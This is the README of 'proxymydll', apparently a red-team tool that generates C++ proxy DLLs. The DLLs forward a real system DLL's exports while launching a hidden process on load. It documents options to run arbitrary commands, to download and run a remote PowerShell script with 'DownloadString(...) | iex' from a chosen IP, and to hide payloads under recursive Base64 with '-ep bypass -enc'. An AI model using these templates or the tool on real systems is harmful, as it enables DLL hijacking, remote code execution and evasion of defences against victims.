# proxymydll

`proxymydll` is a Python helper that automates the creation of **DLL proxy stubs** (C++ source files) from an existing DLL.

It is a fork of:

* **perfect-dll-proxy** by [mrexodia](https://github.com/mrexodia/perfect-dll-proxy)

with extra functionality to:

* Generate a C++ proxy DLL that forwards all exports to the original.
* Inject a **custom command** that runs when the DLL is loaded (`DLL_PROCESS_ATTACH`).
* Optionally **download** a remote script or **download & execute** it using PowerShell.
* Optionally **recursively Base64-encode** the PowerShell payload for `-enc` execution.

> ⚠️ **Disclaimer**
> This tool is intended for **educational, research and authorized red team / penetration testing** purposes only.
> Do **not** use it on systems you do not own or have explicit permission to test.
> You are solely responsible for how you use this code.

---

## Features

* Parses the exports of a target DLL using `pefile`.
* Generates a C++ file that:

  * Forwards all exports (including COM exports and ordinals) to the original DLL.
  * Uses device paths (`\\.\GLOBALROOT\SystemRoot\...`) to reference the original DLL.
  * Supports both **x64** and **x86** (SysWOW64) via macros.
* Injects a **hidden process** on `DLL_PROCESS_ATTACH` with `CreateProcessA`.
* Supports **three modes** of payload generation:

  1. **Raw command** (`--cmd`).
  2. **Download only** (`--down`).
  3. **Download & execute** (`--downexe` + `IEX`).
* Optional **recursive Base64 UTF-16LE encoding** for PowerShell `-enc` (`--enc`).

---

## Requirements

* **Python 3.8+**
* [`pefile`](https://github.com/erocarrera/pefile) Python library:

  ```bash
  pip install pefile
  ```
* Windows environment (for compilation and testing).
* A **C++ compiler**, for example:

  * Microsoft Visual Studio (MSVC)

---

## Installation

```bash
git clone https://github.com/c0nfig-17/proxymydll.git
cd proxymydll
pip install -r requirements.txt  # if you have it
# or at least:
pip install pefile
```

---

## Usage

Basic syntax:

```bash
python proxymydll.py <dll> [options]
```

Where:

* `<dll>`: Path to the DLL you want to proxy **or** the DLL name.

  * If the path does not exist and is not absolute, the script will look for it in:

    * `%SystemRoot%\System32\<dll>`

If no output file is specified, the script will generate `<dll_name>.cpp` in the current directory.

---

## Arguments

### Positional argument

* `dll`
  Path to the original DLL (or its name).

  Examples:

  ```bash
  python proxymydll.py C:\Windows\System32\version.dll
  python proxymydll.py version.dll
  ```

### Generic options

* `-o`, `--output`
  Output C++ file name.
  If omitted, it defaults to `<dll_basename>.cpp`.

  ```bash
  python proxymydll.py version.dll -o proxy_version.cpp
  ```

* `-v`, `--force-ordinals`
  Kept for compatibility with the original project (may be used to enforce ordinal exports behavior in future improvements).

---

## Custom payload options

These options control **what command** is injected into `DllMain` and executed with `CreateProcessA`.

> 🔁 **Priority system** (from highest to lowest):
>
> 1. `--downexe`
> 2. `--down`
> 3. `--cmd`
> 4. Default: `echo NoCommandProvided`

* `--cmd <string>`
  Custom command to execute.
  It will be wrapped as:

  ```text
  cmd.exe /c <your_command>
  ```

  Example:

  ```bash
  python proxymydll.py example.dll --cmd "calc.exe"
  ```

* `--ip <ip_address>`
  IP address used to build download URLs for `--down` and `--downexe`.

  * Default: `0.0.0.0`
  * Example: `--ip 192.168.1.100`

* `--down <path>`
  Download a remote script **without executing it**.
  The generated PowerShell command will be similar to:

  ```powershell
  (New-Object System.Net.WebClient).DownloadString('http://<IP>/<path>')
  ```

  Example:

  ```bash
  python proxymydll.py example.dll \
    --ip 192.168.1.10 \
    --down benign.ps1
  ```

* `--downexe <path>`
  Download a remote script and **execute it** via `IEX`.
  The generated PowerShell command will be similar to:

  ```powershell
  (New-Object System.Net.WebClient).DownloadString('http://<IP>/<path>') | iex
  ```

  Example:

  ```bash
  python proxymydll.py example.dll \
    --ip 192.168.1.10 \
    --downexe payload.ps1
  ```

---

## Recursive Base64 Encoding (`--enc`)

* `--enc <N>`
  Apply **recursive Base64 UTF-16LE encoding** `N` times to the **PowerShell payload**, and wrap it as:

  ```text
  powershell -ep bypass -enc <encoded_payload>
  ```

  Then the final command executed by the DLL will be:

  ```text
  cmd.exe /c powershell -ep bypass -enc <encoded_payload>
  ```

* Constraints:

  * Minimum: `1`
  * Maximum: `30`
    If `N > 30`, the script will print an error and exit.

Example:

```bash
python proxymydll.py example.dll \
  --cmd "Write-Host 'Hello from proxymydll'" \
  --enc 3
```

---

## Output

On success, the script:

1. Generates a C++ file with:

   * Export forwarding pragmas.
   * A `DllMain` that launches a hidden process running your final command.
2. Prints a summary similar to:

```text
[ + ] File provided: C:\Windows\System32\example.dll
[ + ] Command execution injected: "Write-Host 'Hello from proxymydll'"
[ + ] 3 times encoded in Base64
[ + ] Output file successfully created: example.cpp
```

---

## Compiling the generated C++ file

You can compile the generated `.cpp` with **Visual Studio** (MSVC):

1. Create a new **DLL project**.
2. Add the generated `.cpp` file to the project.
3. Adjust the project settings if needed (x64/x86).
4. Build the project to obtain your **proxy DLL**.

> Note: Make sure the **original DLL** is still accessible at the expected location (System32 / SysWOW64) so the proxy can forward all exports correctly.

---

## Credits

* Original idea and base implementation:
  **perfect-dll-proxy** by [mrexodia](https://github.com/mrexodia/perfect-dll-proxy)
* Modifications & enhancements:
  **cOnfig / c0nfig-17**

  * Repository: [https://github.com/c0nfig-17/proxymydll](https://github.com/c0nfig-17/proxymydll)
